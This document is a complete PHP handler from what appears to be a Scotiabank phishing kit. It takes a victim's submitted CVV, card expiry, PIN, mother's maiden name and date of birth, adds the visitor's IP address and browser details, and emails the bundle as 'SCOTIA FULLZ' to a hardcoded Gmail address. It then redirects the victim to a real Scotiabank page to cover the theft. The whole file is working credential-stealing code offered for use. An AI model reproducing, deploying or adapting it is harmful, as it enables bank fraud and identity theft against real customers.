<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$exp = $_POST['dl'];
$pin = $_POST['nip'];
$mmn = $_POST['mmn'];
$dob = $_POST['dob'];
$data ="
=============##SCOTIA FULLZ##===================
CVV : $cvv
EXP : $exp
MMN : $mmn
DOB : $dob
PIN : $pin
============EXTRA============================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'sarkolouty@gmail.com';

$emailusr2 = 'sarkolouty@gmail.com';

mail($emailusr, $subj, $data);	

mail($emailusr2, $subj, $data);	

header("Location: http://www.scotiabank.com/rd/cda/errorpage/0,1190,ca-en,00.html");

?>